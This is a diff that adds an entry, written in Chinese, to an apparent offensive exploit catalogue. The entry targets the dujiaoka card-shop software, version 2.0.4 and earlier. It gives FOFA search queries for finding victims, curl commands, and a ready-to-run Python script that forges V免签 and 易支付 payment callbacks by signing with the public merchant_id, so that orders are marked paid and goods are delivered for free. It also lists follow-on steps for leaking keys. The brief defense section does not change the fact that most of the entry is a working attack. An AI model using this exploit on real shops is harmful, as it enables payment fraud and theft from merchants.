@@ -1,0 +1,107 @@
+id: "payment-bypass-dujiaoka-notify-forgery"
+name: "独角数卡伪造支付回调"
+category: "payment-bypass"
+subcategory: "notify-forgery"
+severity: "critical"
+
+description: |
+  独角数卡(dujiaoka) ≤2.0.4 支付回调接口存在签名可伪造漏洞。
+  V免签/易支付等使用 GET 请求接收支付通知，签名密钥为公开的 merchant_id，
+  攻击者可自行构造参数计算签名，直接 GET 请求标记订单为已支付。
+  项目已归档(2026.03.12)，永不复修。
+
+trigger_signals:
+  - "FOFA: app=\"独角数卡\" 或 body=\"dujiaoka\""
+  - "GET /pay/vpay/notify_url 返回 'fail'"
+  - "GET /pay/yipay/notify_url?out_trade_no=test 返回 'fail'"
+  - "页面底部 copyright 含 'dujiaoka' 或 '独角数卡'"
+  - "响应头 Set-Cookie 含 laravel_session"
+
+payloads:
+  - technique: "V免签伪造支付(GET,最简单)"
+    payload: |
+      # 1. 获取 merchant_id（支付配置页或调试信息）
+      # 2. 创建订单获取 order_sn
+      order_sn="2024010112345678"
+      price="0.01"
+      reallyPrice="0.01"
+      type="1"  # 1=微信 2=支付宝
+      payId="$(date +%Y%m%d%H%M%S)999"
+      merchant_id="12345"
+      
+      # 3. 计算签名: md5(payId + param + type + price + reallyPrice + merchant_id)
+      sign=$(echo -n "${payId}${order_sn}${type}${price}${reallyPrice}${merchant_id}" | md5sum | cut -d' ' -f1)
+      
+      # 4. 触发
+      curl "https://target.com/pay/vpay/notify_url?payId=${payId}&param=${order_sn}&type=${type}&price=${price}&reallyPrice=${reallyPrice}&sign=${sign}"
+      # 返回 "success" = 订单已标记已支付
+
+  - technique: "易支付伪造支付(GET)"
+    payload: |
+      # 签名: md5(排序后参数串 + merchant_pem)
+      # 参数: out_trade_no, trade_no, money, pid, type, name, trade_status
+      curl "https://target.com/pay/yipay/notify_url?out_trade_no=${order_sn}&trade_no=FAKE001&money=${price}&pid=1001&type=alipay&name=test&trade_status=TRADE_SUCCESS&sign=${computed_sign}"
+
+  - technique: "Python全自动利用"
+    payload: |
+      import requests, hashlib, time
+      
+      TARGET = "https://target.com"
+      MERCHANT_ID = "12345"       # 从支付配置获取
+      ORDER_SN = "20240101001"    # 自己创建的订单号
+      
+      # V免签伪造
+      params = {
+          "payId": f"FAKE{int(time.time())}",
+          "param": ORDER_SN,
+          "type": "1",
+          "price": "0.01",
+          "reallyPrice": "0.01",
+      }
+      params["sign"] = hashlib.md5(
+          f"{params['payId']}{params['param']}{params['type']}"
+          f"{params['price']}{params['reallyPrice']}{MERCHANT_ID}".encode()
+      ).hexdigest()
+      
+      r = requests.get(f"{TARGET}/pay/vpay/notify_url", params=params)
+      print(f"结果: {r.text}")  # "success" = 成功
+
+success_indicators:
+  - "notify_url 返回 'success'"
+  - "订单状态从 '待支付' 变为 '已支付'"
+  - "商品自动发货（卡密/文件）"
+
+prerequisites:
+  - "目标使用独角数卡 ≤2.0.4"
+  - "能获取 merchant_id（公开信息，支付配置中可见）"
+  - "能创建订单获取 order_sn"
+  - "V免签/易支付等使用GET接收notify的支付方式已启用"
+
+upgrade_paths:
+  - "伪造支付 → 获取商品/卡密 → 零成本购买"
+  - "如果能获取 merchant_pem/merchant_key → 伪造所有支付方式"
+  - "结合 APP_DEBUG=true → 报错页泄露 merchant_key"
+
+defense:
+  - "升级到 Dujiao-Next（新架构）"
+  - "notify 改为 POST + IP 白名单"
+  - "签名密钥使用随机强密钥而非 merchant_id"
+  - "添加请求重放检测（nonce/timestamp）"
+
+sources:
+  - agent: "黑骡 v1.1.0"
+    date: "2026-07-23"
+  - ref: "https://github.com/assimon/dujiaoka（已归档）"
+  - ref: "CWE-347: Improper Verification of Cryptographic Signature"
+
+tools:
+  - "curl"
+  - "Python requests + hashlib"
+  - "FOFA"
+
+confidence: "high"
+
+limitations:
+  - "需要知道 merchant_id（通常公开可见）"
+  - "V免签和易支付使用GET，其他支付方式需要POST+签名"
+  - "dujiaoka 已归档，新版 Dujiao-Next 可能已修复"
